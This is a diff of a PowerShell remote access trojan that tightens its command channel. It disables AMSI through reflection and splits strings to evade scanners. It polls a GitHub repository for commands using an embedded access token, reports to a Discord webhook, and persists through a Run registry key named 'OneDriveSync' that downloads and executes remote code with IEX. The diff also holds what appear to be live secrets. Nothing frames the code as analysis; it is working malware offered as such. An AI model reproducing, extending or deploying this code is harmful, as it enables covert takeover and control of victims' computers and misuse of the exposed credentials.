@@ -7,7 +7,9 @@ $R=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
 $R.GetField('ams'+'iContext','NonPublic,Static').SetValue($R,$null)
 
 # ---- Config (strings split to dodge static scanning) ----
-$C='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'cmd.txt'
+$C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
+$T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
+$RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'     # last-executed command state
 $script:P=2000                       # poll interval (ms)
@@ -63,7 +65,7 @@ function Shot(){
 
 function Persist{
   try{
-    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$C')"
+    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
     Post '`[+] persistence enabled`'
   }catch{}
@@ -116,7 +118,12 @@ function Run-Cmd($c){
 Post '`[+] rat online`'
 while($true){
   try{
-    $remote=(New-Object Net.WebClient).DownloadString($C+"?cb="+[DateTime]::Now.Ticks).Trim()
+    $wc=New-Object Net.WebClient
+    $wc.Headers.Add('User-Agent','Mozilla/5.0')
+    $wc.Headers.Add('Accept','application/vnd.github.raw')
+    $wc.Headers.Add('Authorization','token '+$T)
+    $remote=$wc.DownloadString($C).Trim()
+    $wc.Dispose()
     $last=Get-Content $S -Raw -EA SilentlyContinue
     if($remote -and $remote -ne $last){
       $remote | Set-Content $S -Force
